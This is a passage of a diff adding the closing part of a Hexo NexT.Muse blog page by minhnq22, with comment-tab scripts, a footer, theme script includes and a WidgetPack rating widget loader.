+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">minhnq22</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+  <script>
+  if (CONFIG.page.isPost) {
+    wpac_init = window.wpac_init || [];
+    wpac_init.push({
+      widget: 'Rating',
+      id    : 29122,
+      el    : 'wpac-rating',
+      color : '#fc6423'
+    });
+    (function() {
+      if ('WIDGETPACK_LOADED' in window) return;
+      WIDGETPACK_LOADED = true;
+      var mc = document.createElement('script');
+      mc.type = 'text/javascript';
+      mc.async = true;
+      mc.src = '//embed.widgetpack.com/widget.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+    })();
+  }
+  </script>
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+  
+
+
+
+
+
+
+</body>
+</html>
